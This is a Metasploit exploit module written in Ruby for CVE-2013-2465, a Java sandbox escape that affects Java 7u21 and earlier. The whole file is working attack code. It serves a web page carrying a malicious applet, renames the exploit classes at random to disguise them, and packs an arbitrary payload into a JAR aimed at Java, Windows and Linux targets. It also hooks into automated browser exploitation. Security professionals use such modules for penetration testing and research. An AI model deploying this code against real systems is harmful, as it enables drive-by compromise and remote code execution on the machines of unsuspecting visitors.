##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking # Because there isn't click2play bypass, plus now Java Security Level High by default

  include Msf::Exploit::Remote::HttpServer::HTML

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  def initialize( info = {} )
    super( update_info( info,
      'Name'          => 'Java storeImageArray() Invalid Array Indexing Vulnerability',
      'Description'   => %q{
        This module abuses an Invalid Array Indexing Vulnerability on the
        static function storeImageArray() function in order to produce a
        memory corruption and finally escape the Java Sandbox. The vulnerability
        affects Java version 7u21 and earlier. The module, which doesn't bypass
        click2play, has been tested successfully on Java 7u21 on Windows and
        Linux systems.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Unknown',  # From PacketStorm
          'sinn3r', # Metasploit
          'juan vazquez' # Metasploit
        ],
      'References'    =>
        [
          [ 'CVE', '2013-2465' ],
          [ 'OSVDB', '96269' ],
          [ 'EDB', '27526' ],
          [ 'URL', 'http://packetstormsecurity.com/files/122777/' ],
          [ 'URL', 'http://hg.openjdk.java.net/jdk7u/jdk7u-dev/jdk/rev/2a9c79db0040' ]
        ],
      'Platform'      => [ 'java', 'win', 'linux' ],
      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
      'Targets'       =>
        [
          [ 'Generic (Java Payload)',
            {
              'Arch'     => ARCH_JAVA,
              'Platform' => 'java'
            }
          ],
          [ 'Windows Universal',
            {
              'Arch'     => ARCH_X86,
              'Platform' => 'win'
            }
          ],
          [ 'Linux x86',
            {
              'Arch'     => ARCH_X86,
              'Platform' => 'linux'
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 12 2013'
      ))
  end

  def setup
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-2465", "Exploit.class")
    @exploit_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-2465", "Exploit$MyColorModel.class")
    @color_model_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-2465", "Exploit$MyColorSpace.class")
    @color_space_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }

    @exploit_class_name = rand_text_alpha("Exploit".length)
    @color_model_class_name = rand_text_alpha("MyColorModel".length)
    @color_space_class_name = rand_text_alpha("MyColorSpace".length)

    @exploit_class.gsub!("Exploit", @exploit_class_name)
    @exploit_class.gsub!("MyColorModel", @color_model_class_name)
    @exploit_class.gsub!("MyColorSpace", @color_space_class_name)

    @color_model_class.gsub!("Exploit", @exploit_class_name)
    @color_model_class.gsub!("MyColorModel", @color_model_class_name)
    @color_model_class.gsub!("MyColorSpace", @color_space_class_name)


    @color_space_class.gsub!("Exploit", @exploit_class_name)
    @color_space_class.gsub!("MyColorModel", @color_model_class_name)
    @color_space_class.gsub!("MyColorSpace", @color_space_class_name)

    super
  end

  def on_request_uri( cli, request )
    print_debug("Requesting: #{request.uri}")
    if request.uri !~ /\.jar$/i
      if not request.uri =~ /\/$/
        print_status("Sending redirect...")
        send_redirect(cli, "#{get_resource}/", '')
        return
      end

      print_status("Sending HTML...")
      send_response_html(cli, generate_html, {'Content-Type'=>'text/html'})
      return
    end

    print_status("Sending .jar file...")
    send_response(cli, generate_jar(cli), {'Content-Type'=>'application/java-archive'})

    handler( cli )
  end

  def generate_html
    jar_name = rand_text_alpha(5+rand(3))
    html = %Q|<html>
    <head>
    </head>
    <body>
    <applet archive="#{jar_name}.jar" code="#{@exploit_class_name}" width="1000" height="1000">
    </applet>
    </body>
    </html>
    |
    html = html.gsub(/^\t\t/, '')
    return html
  end

  def generate_jar(cli)

    p = regenerate_payload(cli)
    jar  = p.encoded_jar

    jar.add_file("#{@exploit_class_name}.class", @exploit_class)
    jar.add_file("#{@exploit_class_name}$#{@color_model_class_name}.class", @color_model_class)
    jar.add_file("#{@exploit_class_name}$#{@color_space_class_name}.class", @color_space_class)
    metasploit_str = rand_text_alpha("metasploit".length)
    payload_str = rand_text_alpha("payload".length)
    jar.entries.each { |entry|
      entry.name.gsub!("metasploit", metasploit_str)
      entry.name.gsub!("Payload", payload_str)
      entry.data = entry.data.gsub("metasploit", metasploit_str)
      entry.data = entry.data.gsub("Payload", payload_str)
    }
    jar.build_manifest

    return jar.pack
  end

end
